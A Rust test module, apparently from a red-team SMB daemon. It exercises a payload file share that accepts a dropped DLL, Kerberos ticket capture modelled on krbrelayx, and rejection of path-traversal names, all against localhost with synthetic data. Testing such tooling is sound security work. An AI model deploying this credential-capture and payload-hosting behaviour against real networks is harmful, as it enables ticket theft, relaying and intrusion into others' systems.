        // 1 second after epoch = base + 10_000_000 (100-ns units)
        let t = std::time::UNIX_EPOCH + std::time::Duration::from_secs(1);
        assert_eq!(systemtime_to_filetime(t), 116_444_736_010_000_000);
    }

    #[test]
    fn resolve_share_path_valid_and_nested() {
        let root = Path::new("/srv/share");
        let p = SmbDaemon::resolve_share_path(root, "payload.dll");
        assert_eq!(p, Some(PathBuf::from("/srv/share/payload.dll")));
        let nested = SmbDaemon::resolve_share_path(root, r"sub\dir\tool.exe");
        assert_eq!(nested, Some(PathBuf::from("/srv/share/sub/dir/tool.exe")));
        // Leading backslash is stripped (UNC-style create name)
        let unc = SmbDaemon::resolve_share_path(root, r"\payload.dll");
        assert_eq!(unc, Some(PathBuf::from("/srv/share/payload.dll")));
    }

    #[test]
    fn resolve_share_path_rejects_traversal_and_device_paths() {
        let root = Path::new("/srv/share");
        assert_eq!(SmbDaemon::resolve_share_path(root, ".."), None);
        assert_eq!(SmbDaemon::resolve_share_path(root, r"..\..\evil.txt"), None);
        assert_eq!(SmbDaemon::resolve_share_path(root, r"a\..\..\evil"), None);
        assert_eq!(SmbDaemon::resolve_share_path(root, "C:evil.dll"), None);
        // A UNC-style create name does not escape the share root: the leading
        // backslashes are stripped and the path resolves inside the share.
        assert_eq!(
            SmbDaemon::resolve_share_path(root, r"\\attacker\share"),
            Some(PathBuf::from("/srv/share/attacker/share"))
        );
    }

    #[test]
    fn glob_match_wildcards_and_case() {
        assert!(SmbDaemon::glob_match("*", "anything.txt"));
        assert!(SmbDaemon::glob_match("*.dll", "payload.dll"));
        assert!(SmbDaemon::glob_match("*.DLL", "payload.dll"));
        assert!(SmbDaemon::glob_match("pay*.dll", "payload.dll"));
        assert!(SmbDaemon::glob_match("pay?oad", "payload"));
        assert!(!SmbDaemon::glob_match("*.dll", "payload.exe"));
        assert!(!SmbDaemon::glob_match("pay", "payload"));
        assert!(SmbDaemon::glob_match("exact", "exact"));
    }

    // -----------------------------------------------------------
    // FileShare mode integration: raw SMB2 client against SmbDaemon
    // -----------------------------------------------------------

    /// Build a raw SMB2 frame: NBSS header + SMB2 header + body.
    fn smb2_frame(
        command: u16,
        message_id: u64,
        session_id: u64,
        tree_id: u32,
        body: &[u8],
    ) -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.push(0x00);
        let total = SMB2_HEADER_SIZE + body.len();
        pkt.extend_from_slice(&(total as u32).to_le_bytes()[1..4]);
        pkt.extend_from_slice(SMB2_PROTOCOL);
        pkt.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
        pkt.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Status
        pkt.extend_from_slice(&command.to_le_bytes());
        pkt.extend_from_slice(&1u16.to_le_bytes()); // Credits
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Flags
        pkt.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
        pkt.extend_from_slice(&message_id.to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Reserved
        pkt.extend_from_slice(&tree_id.to_le_bytes());
        pkt.extend_from_slice(&session_id.to_le_bytes());
        pkt.extend_from_slice(&[0u8; 16]); // Signature
        pkt.extend_from_slice(body);
        pkt
    }

    fn negotiate_body() -> Vec<u8> {
        let mut b = Vec::new();
        b.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
        b.push(0x00); // SecurityMode: no signing
        b.push(0x00); // Reserved
        b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
        b.extend_from_slice(&[0x11; 16]); // ClientGuid
        b.extend_from_slice(&0u32.to_le_bytes()); // NegotiateContextOffset
        b.extend_from_slice(&0u16.to_le_bytes()); // NegotiateContextCount
        b.extend_from_slice(&0u16.to_le_bytes()); // Reserved2
        b.extend_from_slice(&1u16.to_le_bytes()); // DialectCount
        b.extend_from_slice(&SMB2_DIALECT_202.to_le_bytes()); // 2.0.2
        b
    }

    fn minimal_ntlmssp(msg_type: u32) -> Vec<u8> {
        let mut m = Vec::new();
        m.extend_from_slice(b"NTLMSSP\x00");
        m.extend_from_slice(&msg_type.to_le_bytes());
        m.extend_from_slice(&0u32.to_le_bytes()); // Flags
        if msg_type == 3 {
            // LM/LM len+off, NTLM len+off, domain, user, workstation,
            // session key -- all zero-length fields for a synthetic blob
            for _ in 0..6 {
                m.extend_from_slice(&0u16.to_le_bytes());
                m.extend_from_slice(&0u16.to_le_bytes());
            }
            m.extend_from_slice(&0u32.to_le_bytes()); // NegotiateFlags
        }
        m
    }

    fn session_setup_body(sec_data: &[u8]) -> Vec<u8> {
        // NOTE: matches the daemon's parser (offset/len at body[4..8])
        let mut b = Vec::new();
        b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
        b.push(0); // Flags
        b.push(0); // SecurityMode
        b.extend_from_slice(&((SMB2_HEADER_SIZE + 24) as u16).to_le_bytes()); // sec offset
        b.extend_from_slice(&(sec_data.len() as u16).to_le_bytes()); // sec len
        b.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
        b.extend_from_slice(&[0u8; 12]); // Channel + PreviousSessionId spare
        b.extend_from_slice(sec_data);
        b
    }

    fn tree_connect_body(share: &str) -> Vec<u8> {
        let path_u16: Vec<u8> = share.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut b = Vec::new();
        b.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
        b.extend_from_slice(&0u16.to_le_bytes()); // Reserved
        b.extend_from_slice(&((SMB2_HEADER_SIZE + 8) as u16).to_le_bytes()); // PathOffset
        b.extend_from_slice(&(path_u16.len() as u16).to_le_bytes());
        b.extend_from_slice(&path_u16);
        b
    }

    fn create_body(name: &str, disposition: u32, options: u32, desired_access: u32) -> Vec<u8> {
        let name_u16: Vec<u8> = name.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut b = Vec::new();
        b.extend_from_slice(&57u16.to_le_bytes()); // StructureSize
        b.push(0); // OplockLevel
        b.push(0); // SecurityFlags
        b.extend_from_slice(&2u32.to_le_bytes()); // ImpersonationLevel
        b.extend_from_slice(&0u64.to_le_bytes()); // SmbCreateFlags
        b.extend_from_slice(&0u64.to_le_bytes()); // Reserved
        b.extend_from_slice(&desired_access.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes()); // FileAttributes
        b.extend_from_slice(&0u32.to_le_bytes()); // ShareAccess
        b.extend_from_slice(&disposition.to_le_bytes());
        b.extend_from_slice(&options.to_le_bytes());
        b.extend_from_slice(&((SMB2_HEADER_SIZE + 56) as u16).to_le_bytes()); // NameOffset
        b.extend_from_slice(&(name_u16.len() as u16).to_le_bytes()); // NameLength
        b.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsOffset
        b.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsLength
        b.extend_from_slice(&name_u16);
        b
    }

    fn read_body(file_id: u64, offset: u64, len: u32) -> Vec<u8> {
        let mut b = Vec::new();
        b.extend_from_slice(&49u16.to_le_bytes()); // StructureSize
        b.push(0); // Padding
        b.push(0); // Reserved
        b.extend_from_slice(&len.to_le_bytes()); // Length
        b.extend_from_slice(&offset.to_le_bytes());
        b.extend_from_slice(&file_id.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes()); // MinimumCount
        b.extend_from_slice(&0u32.to_le_bytes()); // Channel
        b.extend_from_slice(&0u32.to_le_bytes()); // RemainingBytes
        b
    }

    fn write_body(file_id: u64, offset: u64, payload: &[u8]) -> Vec<u8> {
        let mut b = Vec::new();
        b.extend_from_slice(&49u16.to_le_bytes()); // StructureSize
        b.extend_from_slice(&((SMB2_HEADER_SIZE + 48) as u16).to_le_bytes()); // DataOffset
        b.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        b.extend_from_slice(&offset.to_le_bytes());
        b.extend_from_slice(&file_id.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes()); // Channel
        b.extend_from_slice(&0u32.to_le_bytes()); // RemainingBytes
        while b.len() < 48 {
            b.push(0);
        }
        b.extend_from_slice(payload);
        b
    }

    fn close_body(file_id: u64) -> Vec<u8> {
        // MS-SMB2 2.2.27: StructureSize(2), Flags(2), Reserved(4),
        // FileId(16) -- persistent id occupies body[8..16].
        let mut b = Vec::new();
        b.extend_from_slice(&15u16.to_le_bytes()); // StructureSize
        b.extend_from_slice(&0u16.to_le_bytes()); // Flags
        b.extend_from_slice(&0u32.to_le_bytes()); // Reserved
        b.extend_from_slice(&file_id.to_le_bytes()); // Persistent FileId
        b.extend_from_slice(&file_id.to_le_bytes()); // Volatile FileId
        b
    }

    fn query_directory_body(pattern: &str, info_class: u8) -> Vec<u8> {
        let pat_u16: Vec<u8> = pattern
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let mut b = Vec::new();
        b.extend_from_slice(&33u16.to_le_bytes()); // StructureSize
        b.push(info_class); // FileInformationClass
        b.push(0); // Flags
        b.extend_from_slice(&0u32.to_le_bytes()); // FileIndex
        b.extend_from_slice(&[0u8; 16]); // FileId
        b.extend_from_slice(&0u16.to_le_bytes()); // OutputBufferOffset
        b.extend_from_slice(&65535u16.to_le_bytes()); // OutputBufferLength
        b.extend_from_slice(&((SMB2_HEADER_SIZE + 32) as u16).to_le_bytes()); // NameOffset
        b.extend_from_slice(&(pat_u16.len() as u16).to_le_bytes()); // NameLength
        b.extend_from_slice(&pat_u16);
        b
    }

    /// Read one NBSS-framed SMB2 response; returns (status, body).
    async fn smb2_read_response(stream: &mut tokio::net::TcpStream) -> (u32, Vec<u8>) {
        use tokio::io::AsyncReadExt;
        let mut nb = [0u8; 4];
        stream.read_exact(&mut nb).await.unwrap();
        let len = u32::from_be_bytes([0, nb[1], nb[2], nb[3]]) as usize;
        let mut rest = vec![0u8; len];
        stream.read_exact(&mut rest).await.unwrap();
        let status = u32::from_le_bytes([rest[8], rest[9], rest[10], rest[11]]);
        (status, rest[SMB2_HEADER_SIZE..].to_vec())
    }

    #[tokio::test]
    async fn file_share_full_flow_negotiate_to_directory_listing() {
        use tokio::io::AsyncWriteExt;

        let tmp = std::env::temp_dir().join(format!("ovt_smbshare_test_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&tmp).unwrap();
        std::fs::write(tmp.join("hello.txt"), b"HELLO-PAYLOAD").unwrap();

        let config = SmbDaemonConfig {
            listen_ip: "127.0.0.1".into(),
            listen_port: 0,
            challenge: None,
            mode: SmbDaemonMode::FileShare {
                share_name: "payloads".into(),
                share_root: tmp.clone(),
            },
            domain_name: "CORP".into(),
            socks5_proxy: None,
            capture_kerberos: false,
            krb_relay_target: None,
        };
        let mut daemon = SmbDaemon::new(config);
        daemon.start().await.unwrap();
        let port = daemon.bound_port();
        assert!(port > 0, "ephemeral port must be recorded");

        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .unwrap();

        // -- NEGOTIATE -------------------------------------------------
        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);

        // -- SESSION_SETUP leg 1 (Type 1) ------------------------------
        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            1,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(1)),
        );
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);

        // -- SESSION_SETUP leg 2 (Type 3) ------------------------------
        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            2,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(3)),
        );
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);

        // -- TREE_CONNECT (any share name maps to the root) ------------
        let req = smb2_frame(
            SMB2_TREE_CONNECT,
            3,
            0,
            0,
            &tree_connect_body(r"\\127.0.0.1\payloads"),
        );
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        assert_eq!(body[2], SHARE_TYPE_DISK);

        // -- CREATE (open existing file for read) ----------------------
        let req = smb2_frame(
            SMB2_CREATE,
            4,
            0,
            1,
            &create_body("hello.txt", FILE_OPEN, 0, FILE_READ_DATA),
        );
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        let read_id = u64::from_le_bytes(body[64..72].try_into().unwrap());

        // -- READ the payload back -------------------------------------
        let req = smb2_frame(SMB2_READ, 5, 0, 1, &read_body(read_id, 0, 4096));
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        let data_len = u32::from_le_bytes([body[4], body[5], body[6], body[7]]);
        assert_eq!(data_len, 13);
        assert_eq!(&body[16..16 + data_len as usize], b"HELLO-PAYLOAD");

        // -- CLOSE -------------------------------------------------------
        let req = smb2_frame(SMB2_CLOSE, 6, 0, 1, &close_body(read_id));
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);

        // -- CREATE + WRITE + CLOSE creates a file on disk ---------------
        let req = smb2_frame(
            SMB2_CREATE,
            7,
            0,
            1,
            &create_body("dropped.dll", FILE_OVERWRITE_IF, 0, FILE_WRITE_DATA),
        );
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        let write_id = u64::from_le_bytes(body[64..72].try_into().unwrap());

        let payload = b"MZ-dropped-payload";
        let req = smb2_frame(SMB2_WRITE, 8, 0, 1, &write_body(write_id, 0, payload));
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);

        let req = smb2_frame(SMB2_CLOSE, 9, 0, 1, &close_body(write_id));
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        assert_eq!(std::fs::read(tmp.join("dropped.dll")).unwrap(), payload);

        // -- QUERY_DIRECTORY lists both files ----------------------------
        let req = smb2_frame(
            SMB2_QUERY_DIRECTORY,
            10,
            0,
            1,
            &query_directory_body("*", FILE_DIRECTORY_INFORMATION_CLASS),
        );
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);
        let blob = &body[8..];
        let blob_text: Vec<u8> = blob
            .chunks(2)
            .flat_map(|c| {
                if c.len() == 2 {
                    vec![c[0], c[1]]
                } else {
                    vec![c[0]]
                }
            })
            .collect();
        let listing: String = String::from_utf16_lossy(
            &blob[68..]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        assert!(listing.contains("hello.txt"), "listing: {}", listing);
        let _ = blob_text;

        // -- Path traversal is rejected ----------------------------------
        let req = smb2_frame(
            SMB2_CREATE,
            11,
            0,
            1,
            &create_body("..\\outside.txt", FILE_OVERWRITE_IF, 0, FILE_WRITE_DATA),
        );
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_ACCESS_DENIED);
        assert!(!tmp.parent().unwrap().join("outside.txt").exists());

        daemon.stop();
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[tokio::test]
    async fn file_share_create_missing_file_open_returns_not_found() {
        use tokio::io::AsyncWriteExt;

        let tmp =
            std::env::temp_dir().join(format!("ovt_smbshare_missing_{}", rand::random::<u32>()));
        std::fs::create_dir_all(&tmp).unwrap();

        let config = SmbDaemonConfig {
            listen_ip: "127.0.0.1".into(),
            listen_port: 0,
            challenge: None,
            mode: SmbDaemonMode::FileShare {
                share_name: "s".into(),
                share_root: tmp.clone(),
            },
            domain_name: "CORP".into(),
            socks5_proxy: None,
            capture_kerberos: false,
            krb_relay_target: None,
        };
        let mut daemon = SmbDaemon::new(config);
        daemon.start().await.unwrap();
        let port = daemon.bound_port();
        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .unwrap();

        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
        stream.write_all(&req).await.unwrap();
        let _ = smb2_read_response(&mut stream).await;

        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            1,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(1)),
        );
        stream.write_all(&req).await.unwrap();
        let _ = smb2_read_response(&mut stream).await;

        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            2,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(3)),
        );
        stream.write_all(&req).await.unwrap();
        let _ = smb2_read_response(&mut stream).await;

        // Open a non-existent file -> OBJECT_NAME_NOT_FOUND
        let req = smb2_frame(
            SMB2_CREATE,
            3,
            0,
            0,
            &create_body("ghost.txt", FILE_OPEN, 0, FILE_READ_DATA),
        );
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_OBJECT_NAME_NOT_FOUND);

        daemon.stop();
        let _ = std::fs::remove_dir_all(&tmp);
    }

    // -----------------------------------------------------------
    // Kerberos capture mode integration (krbrelayx parity)
    // -----------------------------------------------------------

    #[tokio::test]
    async fn kerberos_capture_full_flow_type1_to_apreq() {
        use crate::krb_capture::testutil::build_test_apreq;
        use crate::krb_capture::{KRB5_MECH_OID_TLV, find};
        use tokio::io::AsyncWriteExt;

        let config = SmbDaemonConfig {
            listen_ip: "127.0.0.1".into(),
            listen_port: 0,
            challenge: None,
            mode: SmbDaemonMode::Capture,
            domain_name: "CORP".into(),
            socks5_proxy: None,
            capture_kerberos: true,
            krb_relay_target: None,
        };
        let mut daemon = SmbDaemon::new(config);
        daemon.start().await.unwrap();
        let port = daemon.bound_port();
        assert!(port > 0, "ephemeral port must be recorded");

        let mut stream = tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .unwrap();

        // -- NEGOTIATE -------------------------------------------------
        let req = smb2_frame(SMB2_NEGOTIATE, 0, 0, 0, &negotiate_body());
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_SUCCESS);

        // -- SESSION_SETUP leg 1: krb5 mech must be advertised ---------
        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            1,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(1)),
        );
        stream.write_all(&req).await.unwrap();
        let (status, body) = smb2_read_response(&mut stream).await;
        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);
        assert!(
            find(&body, KRB5_MECH_OID_TLV).is_some(),
            "daemon must steer the client to the krb5 SASL mech"
        );

        // -- SESSION_SETUP leg 2: AP-REQ in the security buffer --------
        let apreq = build_test_apreq();
        let req = smb2_frame(SMB2_SESSION_SETUP, 2, 0, 0, &session_setup_body(&apreq));
        stream.write_all(&req).await.unwrap();
        let (status, _) = smb2_read_response(&mut stream).await;
        assert_eq!(
            status, STATUS_SUCCESS,
            "AP-REQ accept completes the SASL leg"
        );

        // The ticket must be captured with full metadata + kirbi blob
        let tickets = daemon.get_captured_tickets();
        assert_eq!(tickets.len(), 1, "exactly one ticket captured");
        let t = &tickets[0];
        assert_eq!(t.realm, "CORP.LOCAL");
        assert_eq!(t.sname, vec!["cifs", "dc.corp.local"]);
        assert_eq!(t.name_type, 2);
        assert_eq!(t.etype, 18);
        assert_eq!(t.kvno, 2);
        assert_eq!(t.cipher.len(), 100);
        assert!(!t.kirbi.is_empty(), "kirbi (KRB-CRED) must be built");
        assert_eq!(t.apreq_raw, apreq);

        // A NTLMSSP Type 1 in capture mode still works (mixed vinum flow)
        let req = smb2_frame(
            SMB2_SESSION_SETUP,
            3,
            0,
            0,
            &session_setup_body(&minimal_ntlmssp(1)),
        );
        let mut stream2 = tokio::net::TcpStream::connect(("127.0.0.1", port))
            .await
            .unwrap();
        let req_frame = req;
        stream2.write_all(&req_frame).await.unwrap();
        let (status, body2) = smb2_read_response(&mut stream2).await;
        assert_eq!(status, STATUS_MORE_PROCESSING_REQUIRED);
        // capture mode: the response advertises krb5, not an NTLM challenge
        assert!(find(&body2, KRB5_MECH_OID_TLV).is_some());

        daemon.stop();
    }
}
